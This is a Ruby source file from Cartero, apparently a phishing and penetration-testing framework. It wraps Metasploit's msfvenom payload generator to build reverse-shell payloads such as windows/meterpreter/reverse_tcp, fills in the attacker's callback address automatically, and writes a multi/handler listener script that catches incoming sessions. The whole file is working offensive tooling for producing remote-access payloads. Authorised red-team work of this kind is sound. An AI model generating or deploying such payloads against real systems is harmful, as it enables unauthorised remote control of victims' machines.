# Yes I am bastarizing a lot of code from msfvenon. I thought this will be nicer than just calling msfvenon.
# So not to be called-out that I am stealing code in here. I will just say it myself and thank the awesome
# work the people from Metasploit do. If anyone sees any issues with this; I am willing to remove it at any time.
# If not hope you find this useful. :-)

$:.unshift(File.expand_path(File.join(Cartero::MetasploitPath, 'lib')))

require 'msfenv'

$:.unshift(ENV['MSF_LOCAL_LIB']) if ENV['MSF_LOCAL_LIB']

require 'rex'
require 'msf/ui'
require 'msf/base'
require 'msf/core/payload_generator'


class MsfVenomError < StandardError; end
class UsageError < MsfVenomError; end
class NoTemplateError < MsfVenomError; end
class IncompatibleError < MsfVenomError; end


module Cartero
  class Payloads
    def initialize(options={})
      # {
      #  :payload=>"windows/meterpreter/reverse_tcp", :format=>"ruby",
      #  :encoder=>nil, :iterations=>3, :space=>480,
      #  :datastore=>{"LHOST"=>"192.168.0.120"}
      # }
      @options = options
      @datastore={}
    end
    attr_accessor :options
    attr_accessor :datastore
    attr_reader :payload

    def generate
      if datastore.empty?
        payload_options([])
      end
      options[:datastore] = datastore
      options[:framework] = framework
      options[:cli] = false

      begin
        venom_generator =  Msf::PayloadGenerator.new(options)
        @payload = venom_generator.generate_payload
      rescue ::Exception => e
        $stderr.puts e.message
      end
    end

    def output(out)
      output_stream = out
      output_stream.binmode
      output_stream.write payload
    end

    def payload_options(args)
      if args
        args.split(" ").each do |x|
          k,v = x.split('=', 2)
          datastore[k.upcase] = v.to_s
        end
        if options[:payload].to_s =~ /[\_\/]reverse/ and datastore['LHOST'].nil?
          datastore['LHOST'] = Rex::Socket.source_address
        end
      end
    end

    def generate_listener_script
      return "use exploit/multi/handler\n" +
             "set PAYLOAD #{options[:payload]}\n" +
             "set LHOST #{datastore['LHOST']}\n" +
             "set LPORT #{datastore['LPORT'] || "4444"}\n" +
             "set ExitOnSession false\n" +
             "exploit -j\n"

    end

    private
    def init_framework(create_opts={})
      create_opts[:module_types] ||= [ ::Msf::MODULE_PAYLOAD, ::Msf::MODULE_ENCODER, ::Msf::MODULE_NOP ]
      @framework = ::Msf::Simple::Framework.create(create_opts.merge('DisableDatabase' => true))
    end

    def framework
      return @framework if @framework
      init_framework
      @framework
    end


  end
end
